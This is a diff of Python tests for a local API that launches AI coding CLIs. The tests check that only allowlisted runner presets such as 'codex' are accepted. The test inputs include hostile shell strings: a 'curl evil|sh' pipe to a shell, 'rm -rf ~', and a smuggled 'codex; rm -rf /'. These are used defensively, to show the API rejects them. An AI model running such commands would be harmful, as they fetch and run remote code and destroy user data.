@@ -220,29 +220,63 @@ def test_estimate_returns_projection():
         assert "projected_usd" in body
 
 
-def test_build_run_config_ignores_runner_from_request_body():
-    # SECURITY (plan 022, blocker #5): a runner is an arbitrary local command, so the
-    # loopback API must NEVER accept one from the request body (that would be RCE).
-    # Pluggable runners are TOML/CLI-only; a web request can only ever launch `claude`.
+def test_resolve_runner_preset_allowlists_names_rejects_raw_commands():
+    # SECURITY (plan 022, blocker #5): the UI may select a curated preset NAME only.
+    assert s._resolve_runner_preset(None) is None
+    assert s._resolve_runner_preset("") is None
+    assert s._resolve_runner_preset("claude") is None      # built-in / default
+    assert s._resolve_runner_preset("default") is None
+    assert s._resolve_runner_preset("codex") == "codex"    # curated engine preset
+    assert s._resolve_runner_preset("CODEX") == "codex"    # case-insensitive
+    # a RAW command template is rejected, never passed through -> no loopback RCE
+    for hostile in ("sh -c 'curl evil|sh'", "rm -rf ~", "codex; rm -rf /", "./x.sh"):
+        try:
+            s._resolve_runner_preset(hostile)
+            assert False, f"raw command should be rejected: {hostile!r}"
+        except ValueError:
+            pass
+
+
+def test_build_run_config_runner_b_preset_only_arm_a_and_control_stay_claude():
+    # Arm B may be the curated `codex` preset; arm A and the control are ALWAYS claude.
+    # A raw command anywhere is refused. runner_a/runner_off are never read at all.
     orig_skill, orig_target = h.resolve_skill, h.resolve_target
     h.resolve_skill = lambda name: Path(f"/fake/skills/{name}/SKILL.md")
     h.resolve_target = lambda target, prompt: (Path("/fake/repo"), "HEAD",
                                                prompt or "do x", None, None)
     try:
         with tempfile.TemporaryDirectory() as td:
-            req = {"skill_a": "skill-a", "skill_b": None, "target": ".",
-                   "prompt": "do x", "k": 2,
-                   # hostile fields a malicious page might POST:
-                   "runner_a": "sh -c 'curl evil|sh'", "runner_b": "codex",
-                   "runner_off": "rm -rf ~"}
-            cfg, _tasks = s._build_run_config(req, Path(td))
+            # curated preset for arm B is honored; hostile runner_a/off are ignored
+            cfg, _ = s._build_run_config(
+                {"skill_a": "skill-a", "skill_b": None, "target": ".", "prompt": "x",
+                 "k": 2, "runner_b": "codex",
+                 "runner_a": "sh -c 'curl evil|sh'", "runner_off": "rm -rf ~"},
+                Path(td))
+            assert cfg.runner_b == "codex"          # arm B = codex
+            assert cfg.runner_a is None             # arm A is always claude (never read)
+            assert cfg.runner_off is None           # control is always claude (never read)
+            assert cfg.skill_b_name is None and cfg.model_b is None   # codex: no skill/model
+            assert h._pair_is_cross_runner(cfg, *h.primary_pair(cfg))
+
+            # a RAW command in runner_b is refused (ValueError -> 400 at the handler)
+            try:
+                s._build_run_config(
+                    {"skill_a": "skill-a", "target": ".", "prompt": "x",
+                     "runner_b": "sh -c 'curl evil|sh'"}, Path(td))
+                assert False, "raw runner_b command should be rejected"
+            except ValueError:
+                pass
     finally:
         h.resolve_skill, h.resolve_target = orig_skill, orig_target
-    # every runner axis stayed at its safe default -> only the built-in claude runner
-    assert cfg.runner_a is None
-    assert cfg.runner_b is None
-    assert cfg.runner_off is None
-    assert not h._runners_vary(cfg)
+
+
+def test_skills_endpoint_exposes_runner_presets():
+    with _serve() as (port, _):
+        st, data = _request(port, "GET", "/api/skills", token=TOKEN)
+        assert st == 200
+        body = json.loads(data)
+        ids = [r["id"] for r in body["runners"]]
+        assert "claude" in ids and "codex" in ids       # built-in + curated preset
 
 
 def test_estimate_model_comparison_counts_two_arms_no_control():
@@ -256,6 +290,20 @@ def test_estimate_model_comparison_counts_two_arms_no_control():
                                             include_control=False))
         assert st == 200, (st, data)
         assert json.loads(data)["n_runs"] == 6
+
+
+def test_estimate_cross_cli_counts_codex_arm():
+    # runner_b=codex makes a head-to-head even with no skill B: claude+skill vs codex
+    # (+ control). k=2 -> 3 arms x 2 = 6; drop the control -> 2 arms x 2 = 4.
+    with _serve() as (port, _):
+        st, data = _request(port, "POST", "/api/estimate", token=TOKEN,
+                            body=_start_req(k=2, skill_b=None, runner_b="codex"))
+        assert st == 200, (st, data)
+        assert json.loads(data)["n_runs"] == 6
+        st2, data2 = _request(port, "POST", "/api/estimate", token=TOKEN,
+                              body=_start_req(k=2, skill_b=None, runner_b="codex",
+                                              include_control=False))
+        assert json.loads(data2)["n_runs"] == 4
 
 
 # --------------------------------------------------------------------------
